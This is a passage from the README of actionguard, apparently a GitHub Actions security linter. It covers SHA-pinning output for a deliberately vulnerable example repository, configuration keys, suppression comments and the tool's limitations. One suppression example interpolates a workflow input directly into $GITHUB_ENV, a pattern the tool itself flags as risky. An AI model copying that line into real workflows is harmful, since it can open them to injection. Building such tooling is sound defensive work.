examples/vulnerable-repo/.github/workflows/pr-preview.yml:21: actions/checkout@v4 -> actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
examples/vulnerable-repo/.github/workflows/pr-preview.yml:25: actions/setup-node@v4 -> actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
examples/vulnerable-repo/.github/workflows/pr-preview.yml:35: nwtgck/actions-netlify@v3 -> nwtgck/actions-netlify@4cbaf4c08f1a7bfa537d6113472ef4424e4eb654 # v3.0.0
examples/vulnerable-repo/.github/workflows/release.yml:31: actions/checkout@v4 -> actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
examples/vulnerable-repo/.github/workflows/release.yml:43: actions/upload-artifact@v4 -> actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
examples/vulnerable-repo/.github/actions/setup-env/action.yml:22: actions/cache@v4 -> actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
10 reference(s) can be pinned. Re-run with --write to apply.
examples/vulnerable-repo/.github/workflows/release.yml:24: error: `main` not found in example-org/shared-workflows (no such tag or branch, or the repository is missing/private)
```

Resolution uses `git ls-remote` (no token, no API rate limit) and falls back to the GitHub
REST API (`GITHUB_TOKEN`/`GH_TOKEN` is used when set); choose explicitly with
`--resolver git|api`. Local actions and `docker://` references are left alone. This
repository's own CI workflow and the hardened examples were pinned with this command.

## Configuration

actionguard reads `.actionguard.yml` (or `.actionguard.yaml`) from the current directory,
or the file passed with `--config`. All keys are optional:

```yaml
# Rules to run (default: all)
select: [AG001, AG002, AG003, AG004, AG005, AG006, AG007, AG008, AG009, AG010]

# Findings to drop. Each entry is a rule id, a path glob, or a mapping.
# Paths are relative to the config file; `*` stays within a directory, `**` crosses.
ignore:
  - AG009                                  # this rule everywhere
  - "examples/**"                          # every rule under examples/
  - rule: AG003
    paths: [".github/workflows/legacy-*.yml"]
    reason: "legacy release pipeline, scheduled for removal"

# Actions you trust not to need SHA pins (AG003 / AG006). Globs over owner/repo[/path].
trusted-actions:
  - "my-org/*"

# Extra attacker-controlled contexts (patterns; `*` matches one segment).
untrusted-contexts:
  - "github.event.client_payload.command"

min-severity: info   # same as --min-severity
fail-on: low         # same as --fail-on (the CLI flag wins)
```

Unknown keys and malformed entries are rejected with exit code 2, so typos do not
silently disable checks.

## Suppressing findings

Add a comment on the offending line, or on the line directly above it:

```yaml
permissions:
  pull-requests: write # actionguard: ignore[AG004]

# actionguard: ignore[AG001, AG008]
- run: echo "${{ inputs.trusted_value }}" >> "$GITHUB_ENV"
```

`# actionguard: ignore` without a rule list suppresses every rule on that line. The text
summary reports how many findings were suppressed. Prefer suppressions with a short
justification next to them, and prefer fixing over suppressing.

## Limitations

actionguard is a static analyzer with deliberately conservative heuristics. Know where
the edges are:

- **No sanitizer awareness.** Validating a tainted value (`[[ $x =~ ^[0-9]+$ ]]`, a `case`
  allow-list) does not remove taint. Pass validated values on via env vars (as the hardened
  examples do), or suppress with a justification.
- **Shell analysis is pattern-based**, not a full bash/PowerShell parser. It understands
  the common forms of writes to `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` (redirects,
  `tee`, groups, heredocs, `Add-Content`/`Out-File`, Node `fs` calls) and straight-line
  variable assignments, but not functions, loops or control flow. Files that a step writes
  and a later step reads are not tracked (except artifact handling in AG007).
- **No cross-repository resolution.** Reusable workflows and third-party actions are not
  fetched and analysed; their inputs are treated as untrusted from the callee's side, and a
  small curated table describes actions with attacker-controlled outputs.
- **Repository settings are invisible.** Whether a repository is public, its default
  token permissions, fork-PR approval settings and environment protection rules cannot be
  seen from the YAML, so findings describe the worst case. A job with an `environment:` is
  assumed to be approval-gated for AG010.
- **"Executes workspace code" is approximate.** For AG002, any `run:` step, local action or
  known build action after an untrusted checkout counts, even if it happens to be harmless.
- **AG003 distinguishes tags from branches by name** (`v1.2.3` vs `main`) without network
  access; `actionguard pin` resolves refs for real.
- **SARIF severity:** GitHub code scanning reads `security-severity` from the *rule*, so
  alerts there use each rule's default severity; the per-finding severity is in the
  result's `level` and `properties.severity`.
- Expressions inside *folded* (`>`) scalars that span lines may be reported at the start
  of the scalar rather than the exact line.

## Contributing

Issues and pull requests are welcome -- see [CONTRIBUTING.md](CONTRIBUTING.md). Please
report security vulnerabilities in actionguard privately as described in
[SECURITY.md](SECURITY.md).

## License

[MIT](LICENSE) -- Copyright (c) 2026 Opsbreak Inc.
